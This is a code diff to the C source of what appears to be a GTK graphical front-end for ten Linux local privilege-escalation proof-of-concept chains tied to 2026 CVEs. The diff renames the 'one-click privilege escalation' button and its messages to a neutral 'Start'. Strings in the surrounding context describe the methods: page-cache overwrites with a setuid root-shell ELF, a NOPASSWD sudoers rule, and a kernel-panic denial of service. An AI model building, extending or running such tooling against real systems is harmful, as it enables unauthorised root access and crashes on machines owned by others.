@@ -6978,7 +6978,7 @@ static int diagspill_main(int argc, char **argv)
 
 #define APP_TITLE       "DirtyChains · 本地提权"
 /* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
-#define DF_BUILD        "2026-11-06-r38"
+#define DF_BUILD        "2026-11-06-r39"
 #define APP_SUBTITLE    "十链 PoC 图形前端 · " DF_BUILD
 #define LOG_MAX_LINES   20000
 #define PTY_COLS        110
@@ -6995,7 +6995,7 @@ typedef struct {
     const char *desc;    /* 说明 */
     const char *need;    /* 前提 */
     int         engine;  /* 0 = 内置 dirtychains 引擎, 1 = ovswrap 引擎 */
-    unsigned char p_t,     /* 支持一键提权 -t 指定目标 */
+    unsigned char p_t,     /* 支持「开始」即 -start, 可用 -t 指定目标 */
                   p_write, /* 支持 -to/-set 通用写 */
                   p_off;   /* 支持 -offset 起始偏移 */
 } Chain;
@@ -8574,7 +8574,7 @@ static void act_lpe(GtkWidget *w, gpointer data)
                          "setuid(0)+execve(/bin/sh) 的 ELF，然后 exec 该文件 —— "
                          "成功即拿到 root shell；失败时原文件不受影响（只动页缓存）。"))
             return;
-        app_spawn(a, fr_args, "一键提权");
+        app_spawn(a, fr_args, "开始");
         return;
     }
 
@@ -8606,7 +8606,7 @@ static void act_lpe(GtkWidget *w, gpointer data)
                          "成功即拿到 root shell；失败时原文件不受影响（只动页缓存）。"
                          "整个过程约 8 秒。"))
             return;
-        app_spawn(a, cl_args, "一键提权");
+        app_spawn(a, cl_args, "开始");
         return;
     }
 
@@ -8632,7 +8632,7 @@ static void act_lpe(GtkWidget *w, gpointer data)
                          "成功即拿到 root shell。逐字节猜 key，耗时以分钟计；"
                          "写之前会自动备份到 /tmp，失败按日志里的 cp 命令恢复。"))
             return;
-        app_spawn(a, dd_args, "一键提权");
+        app_spawn(a, dd_args, "开始");
         return;
     }
 
@@ -8651,7 +8651,7 @@ static void act_lpe(GtkWidget *w, gpointer data)
                          "大概率 panic 整机重启。这是 DoS 演示，不是提权；"
                          "完整 LPE 仅 6.17/6.19 + 4 vCPU/4GB 成立。仅在 disposable VM 上跑。"))
             return;
-        app_spawn(a, ds_args, "一键提权");
+        app_spawn(a, ds_args, "开始");
         return;
     }
 
@@ -8677,7 +8677,7 @@ static void act_lpe(GtkWidget *w, gpointer data)
                          "这条链会在 /etc/sudoers.d 下写一条 "
                          "NOPASSWD 规则，然后打开 root shell。"))
             return;
-        app_spawn(a, ovs_args, "OVS 一键提权");
+        app_spawn(a, ovs_args, "OVS 开始");
         return;
     }
 
@@ -8704,7 +8704,7 @@ static void act_lpe(GtkWidget *w, gpointer data)
                      "并在成功后把当前会话接管为 root。"))
         return;
 
-    app_spawn(a, args, "一键提权");
+    app_spawn(a, args, "开始");
 }
 
 static void act_write(GtkWidget *w, gpointer data)
@@ -8738,28 +8738,28 @@ static void act_write(GtkWidget *w, gpointer data)
     if (!strcmp(c->id, "-2026-43500")) {
         show_info(a, GTK_MESSAGE_INFO, "该链不支持通用写",
                   "CVE-2026-43500 只能改 /etc/passwd 首行。",
-                  "想验证它请直接点「一键提权」。");
+                  "想验证它请直接点「开始」。");
         return;
     }
     if (c->engine == 1) {
         show_info(a, GTK_MESSAGE_INFO, "该链没有通用写",
                   "CVE-2026-64531 的写原语只能做 32 位递减，"
                   "不能整段写文件。",
-                  "请直接用「一键提权」或「自测」。");
+                  "请直接用「开始」或「自测」。");
         return;
     }
     if (c->engine == 2) {
         show_info(a, GTK_MESSAGE_INFO, "该链没有通用写",
                   "CVE-2026-46300 的载荷固定为内置的 192 字节 ELF，"
                   "只覆盖目标文件开头这一段。",
-                  "要换目标就改「目标文件」和「偏移」，然后点「一键提权」。");
+                  "要换目标就改「目标文件」和「偏移」，然后点「开始」。");
         return;
     }
     if (c->engine == 3) {
         show_info(a, GTK_MESSAGE_INFO, "该链没有通用写",
                   "CVE-2026-43503 的载荷同样固定为 192 字节 ELF，"
                   "而且一次只能写 4 字节，得装 48 个 SA 才写满。",
-                  "要换目标就改「目标文件」和「偏移」，然后点「一键提权」。");
+                  "要换目标就改「目标文件」和「偏移」，然后点「开始」。");
         return;
     }
 
@@ -10925,7 +10925,7 @@ static GtkWidget *build_actions(App *a)
                                 "把 -set 的内容写进 -to 的页缓存，写完校验但不执行");
     gtk_container_add(GTK_CONTAINER(box), a->btn_write);
 
-    a->btn_lpe = gtk_button_new_with_label("一键提权");
+    a->btn_lpe = gtk_button_new_with_label("开始");
     gtk_style_context_add_class(gtk_widget_get_style_context(a->btn_lpe),
                                 "suggested-action");
     gtk_widget_set_tooltip_text(a->btn_lpe,
@@ -11180,7 +11180,7 @@ static void on_menu_help(GtkWidget *w, gpointer data)
         "通用写", "  用 -set 的内容覆盖 -to 的页缓存，可带 -offset。",
         "  目标只需读权限；写完会读回校验，但不执行。",
         "",
-        "一键提权", "  执行 -start。成功后本窗口的输入行即是 root shell。",
+        "开始", "  执行 -start。成功后本窗口的输入行即是 root shell。",
         "",
         "退出码", "  0 完成   1 未通过   2 参数或前置条件   3 本机不可用",
         NULL
